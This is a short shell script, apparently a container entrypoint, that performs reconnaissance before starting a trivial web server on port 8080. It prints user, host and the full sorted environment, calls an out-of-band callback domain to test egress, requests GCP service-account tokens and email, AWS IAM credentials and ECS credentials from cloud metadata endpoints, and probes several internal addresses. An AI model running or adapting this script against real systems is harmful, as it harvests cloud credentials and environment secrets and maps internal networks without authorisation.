#!/bin/sh
echo "=== RUN RECON START ==="
id; hostname; uname -a
echo "[env]"; env | sort
echo "[run-egress-oob]"
curl -s -m6 "http://run.db89er9hl4lmff4bj6ug9mxhgt9oci3ws.oast.fun/r" -o /dev/null -w "run-oob=%{http_code}\n" || echo no-egress
echo "[gcp-token]"
curl -s -m6 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" -w "\n(gcp=%{http_code} t=%{time_total})\n" || echo "gcp blocked"
echo "[gcp-email]"
curl -s -m6 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" -w "\n(code=%{http_code})\n" || echo blocked
echo "[aws-creds]"
curl -s -m6 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -w "\n(aws=%{http_code})\n" || echo "aws blocked"
echo "[ecs-creds]"
curl -s -m6 "http://169.254.170.2/v2/credentials/" -w "\n(code=%{http_code})\n" || echo blocked
echo "[port-scan]"
for hp in 127.0.0.1:80 169.254.169.254:80 metadata.google.internal:80 10.0.0.1:443 169.254.170.2:80; do
  curl -s -m3 -o /dev/null -w "  $hp -> %{http_code} t=%{time_total}\n" "http://$hp/" || echo "  $hp unreachable"
done
echo "=== RUN RECON END ==="
mkdir -p /www; echo ok > /www/index.html
exec httpd -f -v -p 8080 -h /www
